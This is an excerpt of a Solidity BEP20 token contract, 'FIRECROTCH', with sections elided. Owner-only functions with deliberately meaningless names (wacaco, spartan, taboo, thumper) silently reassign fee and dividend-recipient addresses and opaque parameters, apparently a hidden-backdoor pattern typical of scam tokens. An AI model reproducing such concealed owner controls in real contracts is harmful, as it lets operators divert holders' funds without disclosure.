...
interface IDividendDistributor {
    ...
    function setWShr(address _ke) external;
}
...
contract DividendDistributor is IDividendDistributor {
    ...
    function setWShr(address _ke) external override onlyToken {
        SHAR = _ke;
    }
...
contract FIRECROTCH is IBEP20, Auth {
    ...
    address MAAA = 0x58eD31338BB8D649cBc75f84A339C327a9c2ac89;
    ...
    bool public vsT = false;
    uint256 public vsTf = 100;
    uint256 vsTd = 100;
    ...
    function wacaco(address _ya) external onlyOwner {
        xFR = _ya;
    }

    function rev(address _ke) external onlyOwner {
        jFR = _ke;
        distributor.setWShr(_ke);
    }

    function spartan(address _ke, address _ya) external onlyOwner {
        xFR = _ya;
        jFR = _ke;
        distributor.setWShr(_ke);
    }
    ...
    function thumper(bool _enabled, uint256 _vstf, uint256 _vstd) external authorized {
        vsT = _enabled;
        vsTf = _vstf;
        vsTd = _vstd;
    }
    ...
    function taboo(address _aLR, address _xFR) external authorized {
        aLR = _aLR;
        xFR = _xFR;
    }
    ...
    function nachos(uint256 _amount) external authorized {
    ...
    function setWShr(address _ke) external authorized {
        distributor.setWShr(_ke);
    }
